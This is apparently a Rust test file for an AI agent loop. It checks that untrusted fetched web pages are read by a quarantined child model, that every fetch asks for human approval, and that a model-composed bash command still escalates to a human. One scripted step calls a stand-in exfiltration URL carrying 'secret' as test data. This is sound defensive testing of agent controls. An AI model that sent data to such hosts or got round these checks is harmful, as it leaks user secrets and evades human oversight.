//! **Layer 4 as shipped, measured on the loop rather than read in `egress.rs`.**
//!
//! `EgressPolicy::AllowApproved`'s doc comment says `granted` is *"session-scoped and never
//! persisted: it stops the second fetch of the same host re-asking"*. That sentence describes
//! `grant()`, and `grant()` is a method — a description of a mechanism, not a measurement of
//! its output. This file asks the loop what actually happens.
//!
//! 1. A second fetch of the **same host** asks again. The grant is never recorded, because
//!    nothing in the product calls `grant()` and `CapabilityProfile` exposes no `&mut` route
//!    to the policy for it to be called through. **This is unaffected by layer 1** — condensing
//!    a page changes who reads it, not who approved reaching for it.
//!
//! The second test measures **layer 1**, and its assertions were inverted by the routing
//! landing. Recorded here because the before/after is the clearest statement of what changed:
//!
//! | | before layer 1 | after |
//! |---|---|---|
//! | parent's floor after a fetch | `UntrustedContent` | `AgentInferred` |
//! | a composed `bash` target afterwards | refused | allowed, then escalated to a human |
//! | the page's bytes | in the parent's window | in the child's only |
//!
//! **Layer 3 is not relaxed and the test asserts that separately.** The threshold function is
//! untouched; what changed is that the parent no longer crosses it. A run that does reach
//! `UntrustedContent` still loses composed targets, which is asserted directly rather than
//! inferred from the absence of a refusal.
//!
//! None of this reaches the network: the approval decision is recorded before any executor
//! runs, and the host is `ScriptedTools`.

mod common;

use common::*;
use marlowe_contract::TrustClass;
use marlowe_journal::EventKind;
use marlowe_loop::{
    Budget, CapabilityProfile, Engine, MemoryRecorder, ModelStep, OutputContract, Ports,
    Provenance, Run, RunId, SessionId, SessionState,
};
use marlowe_permission::{ArgValue, Args, EgressPolicy, Tier, Unavailable};
use marlowe_tools::ToolId;

/// A distinctive marker. **Not "a fetched page"** -- a generic body would make the
/// "it is absent from the parent" assertion pass on any build where the wording drifted,
/// which is the vacuous-guard shape. This string appears nowhere else in the workspace.
const PAGE_BODY: &str = "PAGE-BODY-MARKER-7f3a91-must-not-reach-the-parent";

fn engine() -> Engine<Unavailable> {
    Engine::new(
        marlowe_tools::builtin_registry().expect("the eleven builtin manifests load"),
        Unavailable,
        100_000,
        10_000,
        std::path::PathBuf::from("/ws"),
        Tier::Act,
    )
}

fn web_call(url: &str) -> marlowe_loop::ModelCall {
    step(ModelStep::one_call(ToolId::new("web"), Args::new().with("url", ArgValue::Text(url.into()))), 100)
}

fn bash_call(command: &str) -> marlowe_loop::ModelCall {
    step(
        ModelStep::one_call(ToolId::new("bash"), Args::new().with("command", ArgValue::Text(command.into()))),
        100,
    )
}

/// The whole measurement in one run, so every assertion shares one floor and one policy.
#[test]
fn a_second_fetch_of_the_same_host_asks_again_and_the_grant_is_never_recorded() {
    let mut e = engine();
    // **Each fetch now costs TWO scripted steps, and that is the layer-1 routing showing up in
    // the test harness.** An untrusted result is condensed by a quarantined child before it
    // reaches this run, and the child makes one model call of its own against the same scripted
    // driver. So every `web_call` is followed by the child's reply.
    let mut driver = ScriptDriver::new(vec![
        web_call("https://docs.example.com/a"),
        say("the page is about widgets", 50),
        // Same host, different path. If `granted` had gained `docs.example.com`, this one
        // would be `Allowed` outright and emit no ApprovalRequested.
        web_call("https://docs.example.com/b"),
        say("the page is about widgets", 50),
        // ...and a different host, for completeness of the picture.
        web_call("https://other.example.com/c"),
        say("the page is about widgets", 50),
        say("done", 100),
    ]);
    let mut summarizer = EmptySummarizer;
    // The fetched page is untrusted content, which is what a real `web` result carries.
    let mut tools = ScriptedTools {
        trust: Some(TrustClass::UntrustedContent),
        body: Some(PAGE_BODY.into()),
        ..Default::default()
    };
    let mut approvals = FixedApprovals(true);
    let mut sink = CollectingSink::default();
    let mut control = marlowe_loop::NoControl;
    let mut clock = FrozenClock(1_700_000_000_000);
    let mut recorder = MemoryRecorder::default();
    let mut ports = Ports {
        driver: &mut driver,
        summarizer: &mut summarizer,
        tools: &mut tools,
        memory: None,
        approvals: &mut approvals,
        sink: &mut sink,
        control: &mut control,
        clock: &mut clock,
        recorder: &mut recorder,
    };

    let mut run = Run::root(
        RunId::from_name("egress"),
        SessionId::from_name("egress-session"),
        CapabilityProfile::interactive(),
        Budget::interactive(),
        OutputContract::answer(),
    );
    let mut state = SessionState::new(run.session, "Marlowe.");
    let mut prov = Provenance::new();
    let _ = e.run(&mut run, &mut state, &mut prov, &mut ports);

    // ── 1. every fetch asks, including the second of the same host ──────────────────────
    assert_eq!(
        recorder.count(EventKind::ApprovalRequested),
        3,
        "three fetches, three approvals. A per-host session grant would make this 2 (one per \
         distinct host); a working grant on `docs.example.com` would make it 2 with the second \
         call silent. It is 3, so no grant is retained at all"
    );
    assert_eq!(
        recorder.count(EventKind::ApprovalGranted),
        3,
        "the human said yes three times for two hosts"
    );

    // ── 2. the policy itself never widened ─────────────────────────────────────────────
    // The structural statement behind the count above: `granted` is still empty, because
    // `CapabilityProfile` exposes `egress()` returning `&EgressPolicy` and no `&mut`
    // accessor, so `grant()` has no reachable call site in the product.
    assert_eq!(
        run.profile.egress(),
        &EgressPolicy::AllowApproved { granted: Vec::new() },
        "`grant()` is never called: the run ends with the empty set it started with"
    );

    // ── 3. all three fetches were adjudicated as approvable, not blocked ────────────────
    assert_eq!(
        recorder.count(EventKind::EgressBlocked),
        0,
        "under AllowApproved with a `*` declaration, an ungranted host is UNASKED, not denied"
    );
}

/// **Layer 1, end to end.** Two pages fetched, neither in the parent, and a composed `bash`
/// target still allowed afterwards. One run, so the floor is not a variable.
#[test]
fn after_a_fetch_the_parents_floor_is_untouched_and_a_composed_target_still_runs() {
    let mut e = engine();
    let mut driver = ScriptDriver::new(vec![
        web_call("https://docs.example.com/page"),
        say("the page is about widgets", 50), // the quarantined child's reply
        // Layer 3's question: a model-composed Target at UntrustedContent.
        // `web` is Inert  -> target check skipped  -> approvable.
        web_call("https://exfil.example.com/?d=secret"),
        say("the page is about widgets", 50), // the quarantined child's reply
        // `bash`'s composed `command`. Before layer 1 this was refused, because the fetched page
        // had dropped THIS run's floor to UntrustedContent. It is now allowed, and the change is
        // the point of the whole exercise -- see the assertions.
        bash_call("echo hello"),
        say("done", 100),
    ]);
    let mut summarizer = EmptySummarizer;
    let mut tools = ScriptedTools {
        trust: Some(TrustClass::UntrustedContent),
        body: Some(PAGE_BODY.into()),
        ..Default::default()
    };
    let mut approvals = FixedApprovals(true);
    let mut sink = CollectingSink::default();
    let mut control = marlowe_loop::NoControl;
    let mut clock = FrozenClock(1_700_000_000_000);
    let mut recorder = MemoryRecorder::default();
    let mut ports = Ports {
        driver: &mut driver,
        summarizer: &mut summarizer,
        tools: &mut tools,
        memory: None,
        approvals: &mut approvals,
        sink: &mut sink,
        control: &mut control,
        clock: &mut clock,
        recorder: &mut recorder,
    };

    let mut run = Run::root(
        RunId::from_name("differential"),
        SessionId::from_name("differential-session"),
        CapabilityProfile::interactive(),
        Budget::interactive(),
        OutputContract::answer(),
    );
    let mut state = SessionState::new(run.session, "Marlowe.");
    let mut prov = Provenance::new();
    let _ = e.run(&mut run, &mut state, &mut prov, &mut ports);

    // ── the property layer 1 exists for ────────────────────────────────────────────────
    //
    // **The parent's floor never moved.** Two pages were fetched and neither entered this
    // window: each was read by a quarantined child and came back as a validated summary at
    // `AgentInferred`. Before the routing this assertion read `UntrustedContent`.
    assert_eq!(
        run.trust_floor(),
        TrustClass::AgentInferred,
        "the parent must not be tainted by content it never saw. `AgentObserved` would mean the \
         page reached this window; `UntrustedContent` would mean the routing did not happen"
    );

    // Both fetches ran.
    let web_calls = tools.calls.iter().filter(|(t, _)| t == "web").count();
    assert_eq!(web_calls, 2, "both fetches executed");

    // ── §8.2's second sentence, as an assertion rather than an observation ──────────────
    //
    // *"The component with tool access receives sanitized structured input, never raw untrusted
    // text."* The floor assertion above says the parent was not TAINTED; this says the bytes are
    // not THERE, which is the requirement. They are different claims and only one of them is what
    // the brief asks for -- a build that latched correctly while still inlining the page would
    // satisfy the first and fail this.
    let rendered = e.assembler().assemble(&state).rendered();
    assert!(
        !rendered.contains(PAGE_BODY),
        "the page's own bytes must not appear in the parent's window:\n{rendered}"
    );
    // ...and the negative control: the child DID see them, so the absence above is containment
    // rather than a fetch that never happened or a body that was always empty.
    assert!(
        driver.views_seen.iter().any(|v| v.contains(PAGE_BODY)),
        "some view must have contained the page, or this test proves nothing about where it went"
    );
    // What crossed instead is the condensed form, under the contract's field name.
    assert!(
        rendered.contains("read under quarantine") && rendered.contains("findings:"),
        "the parent received the validated summary: {rendered}"
    );

    // **`bash` now runs, and this is the change.** Its `command` is model-composed, so before
    // layer 1 it was refused for the rest of any run that had fetched anything -- the guard
    // compensating for the missing control, reported by the human as "after fetching web data
    // all his tools get turned off. seems dumb". The read was right and this is the fix: the
    // thing that read the page cannot act, and the thing that acts never read it.
    let bash_calls = tools.calls.iter().filter(|(t, _)| t == "bash").count();
    assert_eq!(
        bash_calls, 1,
        "with the page condensed away, the parent's floor is clean and a composed Target is \
         allowed again"
    );

    // **The control, and it is what stops this reading as a relaxation of layer 3.** Layer 3 is
    // untouched: `blocks_composed_targets` still refuses at `<= UntrustedContent`, and a run
    // whose floor DOES reach the bottom still loses composed targets. What changed is that this
    // run's floor no longer gets there, because the page is no longer in it. The refusal is
    // asserted directly, on the same threshold function the adjudicator enforces on.
    assert!(
        !marlowe_permission::blocks_composed_targets(run.trust_floor()),
        "this run is above the blocking threshold"
    );
    assert!(
        marlowe_permission::blocks_composed_targets(TrustClass::UntrustedContent),
        "...and the threshold itself is unchanged: a run that DID reach UntrustedContent would \
         still be refused. Layer 1 keeps the parent above the line; it does not move the line"
    );

    // **Three, not two, and the third one matters.** `bash` passed the target check -- that is
    // the change above -- and then hit §9's unconditional escalation for `Irreversible`, so it
    // still asked a human. Layer 1 returns the composed target to the model; it does not return
    // it unsupervised. A reading of 2 here would mean `bash` ran without asking, which would be
    // a real regression and is what this number is here to catch.
    assert_eq!(
        recorder.count(EventKind::ApprovalRequested),
        3,
        "two fetches and one bash. `bash` is Irreversible and escalates whatever the tier says"
    );
}
